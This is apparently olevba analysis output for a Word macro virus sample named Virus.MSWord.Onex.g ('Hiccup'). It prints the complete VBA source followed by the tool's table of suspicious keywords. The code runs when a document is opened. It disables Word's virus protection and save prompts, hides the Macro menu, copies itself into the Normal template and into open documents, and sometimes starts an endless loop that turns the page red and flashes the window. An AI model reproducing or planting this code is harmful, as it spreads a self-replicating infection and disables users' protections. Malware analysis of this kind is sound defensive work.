olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.g-517b8d78ec4472b9541ab49e26956e24a7f68acb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO hiccup.cls 
in file: Virus.MSWord.Onex.g-517b8d78ec4472b9541ab49e26956e24a7f68acb - OLE stream: 'Macros/VBA/hiccup'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
 On Error Resume Next
 Set Code = New DataObject
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
CommandBars("Tools").Controls("Macro").Enabled = 0
  If NormalTemplate.VBProject.VBComponents(1).Name = "hiccup" Then
    callitn = True
   Else
    Set A = NormalTemplate.VBProject.VBComponents(1)
  End If
  If ActiveDocument.VBProject.VBComponents(1).Name = "hiccup" Then
    callita = True
   Else
    Set A = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
  End If
  Set ab = A.CodeModule
   Code.SetText hiccup.VBProject.VBComponents(1).CodeModule.Lines(1, hiccup.VBProject.VBComponents(1).CodeModule.CountOfLines)
   ab.DeleteLines 1, ab.CountOfLines
   ab.InsertLines 1, Code.GetText
   A.Name = "hiccup"
   If callitn = True And callita = True Then
    If Int(Rnd * 8) = 2 Then
      Call hiccup_payload
    End If
   
   End If
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Private Sub hiccup_payload()
On Error Resume Next
ActiveWindow.View.Type = wdPageView
ActiveDocument.Background.Fill.BackColor.RGB = RGB(255, 0, 0)

Do
DoEvents
Randomize
If Int(Rnd * 10000) = 2 Then
 Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMinimize
 Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMaximize
End If
Loop
End Sub
' Word 97/2k - Hiccup - PHSYCO XXX
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

